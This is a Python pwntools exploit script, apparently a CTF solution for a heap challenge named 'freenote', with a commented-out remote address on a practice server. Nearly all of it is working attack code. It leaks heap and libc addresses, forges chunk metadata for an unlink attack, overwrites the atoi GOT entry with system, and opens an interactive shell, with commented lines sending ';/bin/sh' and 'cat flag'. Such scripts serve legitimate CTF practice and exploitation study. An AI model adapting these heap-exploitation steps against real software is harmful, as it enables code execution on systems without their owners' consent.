from pwn import *


def run():
    p = process('./freenote')
    # p = remote('node4.buuoj.cn', 25653)
    elf = ELF('./freenote')
    lib = elf.libc

    def choice(id_):
        p.recvuntil(b':')
        p.sendline(id_)

    def show():
        choice(b'1')

    def add(size_, mess):
        choice(b'2')
        p.recvuntil(b':')
        p.sendline(str(int(size_)).encode())
        p.recvuntil(b':')
        p.send(mess)

    def edit(id_, size_, mess):
        choice(b'3')
        p.recvuntil(b':')
        p.sendline(id_)
        p.recvuntil(b':')
        p.sendline(str(int(size_)).encode())
        p.recvuntil(b':')
        p.send(mess)

    def delete(id_):
        choice(b'4')
        p.recvuntil(b':')
        p.sendline(id_)

    add(0x80, b'a' * 0x80)
    add(0x100, b'a' * 0x100)
    add(0x80, b'a' * 0x80)
    add(0x80, b'a' * 0x80)
    delete(b'2')
    delete(b'0')
    add(0x80, b'a' * 0x80)
    delete(b'2')
    show()
    p.recvuntil(b'0. ')
    heap_addr = u64(p.recvuntil(b'\n')[: -1].ljust(8, b'\00'))
    print(hex(heap_addr))

    add(0x80, b'a' * 0x80)
    show()
    malloc_hook = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - 88 - 0x10
    base_addr = malloc_hook - lib.sym['__malloc_hook']
    system_addr = base_addr + lib.sym['system']
    print(hex(base_addr))

    payload = p64(0) + p64(0x101) + p64(heap_addr - 0x17d8 - 0x18) + p64(heap_addr - 0x17d8 - 0x10) + b'a' * 0xe0 \
              + p64(0x100) + p64(0x90)
    payload = payload.ljust(0x180, b'a')
    edit(b'1', 0x180, payload)
    delete(b'0')
    add(0x80, b'a' * 0x80)
    addr1 = heap_addr - 0x1820 + 0x30
    payload = p64(elf.got['atoi']) + p64(1) + p64(0x8) + p64(elf.got['atoi']) + p64(1) * 44
    edit(b'1', 0x180, payload)
    edit(b'1', 0x8, p64(system_addr))
    gdb.attach(p)
    # p.sendline(b';/bin/sh')
    # p.sendline(b'cat flag')
    p.interactive()


if __name__ == '__main__':
    # while True:
    run()
